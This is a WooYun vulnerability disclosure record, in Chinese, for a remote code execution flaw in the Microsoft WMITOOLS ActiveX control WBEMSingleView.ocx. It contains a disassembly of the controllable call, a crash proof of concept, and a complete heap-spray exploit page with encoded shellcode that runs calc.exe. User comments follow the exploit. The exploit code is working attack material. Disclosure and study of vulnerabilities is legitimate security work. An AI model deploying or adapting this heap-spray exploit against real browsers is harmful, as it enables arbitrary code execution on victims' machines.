{"id": 23746, "wybug_id": "wooyun-2010-01006", "wybug_title": "微软WMITOOLS远程代码执行漏洞", "wybug_corp": "Microsoft", "wybug_author": "牛奶坦克", "wybug_date": "2010-12-22 12:10", "wybug_open_date": "2010-12-22 15:37", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["盲目信任用户数据", "设计缺陷", "堆喷射", "浏览器控件", "浏览器漏洞利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2010-12-22：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2010-12-22：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 微软提供的WMITOOLS存在一个远程代码执行漏洞,攻击者可以直接控制一个调用地址,让程序直接走到我们在内存中已经布置好的shellcode上. 详细说明：  微软提供的WMITOOLS存在一个远程代码执行漏洞,攻击者可以直接控制一个调用地址,让程序直接走到我们在内存中已经布置好的shellcode上.官方地址:http://www.microsoft.com/downloads/en/details.aspx?FamilyID=6430f853-1120-48db-8cc5-f2abdc3ed314&displaylang=en漏洞出在WBEMSingleView.ocx的AddContextRef方法上.[id(0x00000018), helpstring(\"Increment Context Ref Count\")]long AddContextRef(long lCtxtHandle);02D26BF9    837D 08 FF      cmp     dword ptr [ebp+8], -102D26BFD    74 06           je      short 02D26C0502D26BFF    837D 08 00      cmp     dword ptr [ebp+8], 002D26C03    75 07           jnz     short 02D26C0C02D26C05    B8 05400080     mov     eax, 8000400502D26C0A    EB 13           jmp     short 02D26C1F02D26C0C    8B45 08         mov     eax, dword ptr [ebp+8]\t\t//可控的参数02D26C0F    8945 FC         mov     dword ptr [ebp-4], eax02D26C12    8B4D FC         mov     ecx, dword ptr [ebp-4]02D26C15    8B11            mov     edx, dword ptr [ecx]\t\t\t\t//继续传,传给了edx02D26C17    8B45 FC         mov     eax, dword ptr [ebp-4]02D26C1A    50              push    eax02D26C1B    FF12            call    dword ptr [edx]\t\t\t\t\t//控制了这个调用地址   漏洞证明：  POC:\n<html><object classid=\"clsid:2745E5F5-D234-11D0-847A-00C04FD7BB08\" id=\"target\"></object><SCRIPT language=\"JavaScript\">target.AddContextRef(0x0c0c0c0c);</script></html>\n\n\n\n\n可执行shellcode的代码:\n<html><object classid=\"clsid:2745E5F5-D234-11D0-847A-00C04FD7BB08\" id=\"target\"></object><SCRIPT language=\"JavaScript\">//run calc.exevar shellcode = unescape(\"%uc92b%ue983%ud9de%ud9ee%u2474%u5bf4%u7381%u0c13%u452b%u83df%ufceb%uf4e2%uc3f0%udf01%u2b0c%u9ace%ua030%uda39%u2a74%u54aa%u3343%u80ce%u2a2c%u96ae%u1f87%udece%u1ae2%u4685%uafa0%uab85%uea0b%ud28f%ue90d%u2bae%u7f37%udb61%uce79%u80ce%u2a28%ub9ae%u2787%u540e%u3753%u3444%u3787%udece%ua2e7%ufb19%ue808%u1f74%ua068%uef05%ueb89%ud33d%u6b87%u5449%u377c%u54e8%u2364%ud6ae%uab87%udff5%u2b0c%ub7ce%u7430%u2974%u7d6c%u27cc%ueb8f%u8f3e%udb64%udbcf%u4353%u21dd%u2586%u2012%u48eb%ub324%u2b6f%udf45%u0000\");//先喷好堆var bigblock = unescape(\"%u0C0C%u0C0C\");var headersize = 20;var slackspace = headersize+shellcode.length;while (bigblock.length<slackspace) bigblock+=bigblock;fillblock = bigblock.substring(0, slackspace);block = bigblock.substring(0, bigblock.length-slackspace);while(block.length+slackspace<0x40000) block = block+block+fillblock;memory = new Array();for (x=0; x<350; x++) memory[x] = block +shellcode;//让程序直接call过去target.AddContextRef(0x0c0c0c0c);</script></html>\n   修复方案：  有问题,找微软.   版权声明：转载请注明来源 牛奶坦克@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：20 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n     2010-12-22 15:58 |    \t\t0x0F \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:60        | 尖刀安全 (JDSec.Com).......................)\t\t \n  牛洞啊 是原创？  是就有意思了。！ IE所有版本吧？    \n     2010-12-22 19:21 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  应该需要装那个软件的    \n     2010-12-23 09:11 |    \t\t左右 \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:3        | 左右 ? 左. : 右.)\t\t \n  上香膜拜~~    \n     2010-12-23 14:27 |    \t\t蚊虫 \t\t\t( 实习白帽子  |\t\t\t        Rank:36 漏洞数:12        | 我装逼这么牛可还是没妞喜欢我)\t\t \n  好给力的的积极拒绝....    \n     2010-12-24 11:32 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  积极拒绝是因为之前联系过 没有注册吧    \n     2011-12-13 12:07 |    \t\tEnjoy_Hacking \t\t\t( 实习白帽子  |\t\t\t        Rank:84 漏洞数:8        | 时间无言，如此这般。)\t\t \n  我靠、牛掰啊、、、膜拜大牛    \n     2012-05-17 21:56 |    \t\ttpu01yzx \t\t\t( 实习白帽子  |\t\t\t        Rank:58 漏洞数:8        | test)\t\t \n  什么年代的洞了，我的xp加ie6表示没有压力，可能是要装了那个wmitool才有用吧。装的人不多，给rank20多了。    \n     2015-01-20 15:13 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:882 漏洞数:157        | 收wb 1：5 无限量收 [平台担保]))\t\t \n  @tpu01yzx 逗比，你也不看看什么时候的漏洞...    \n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 20, "Ranks": null}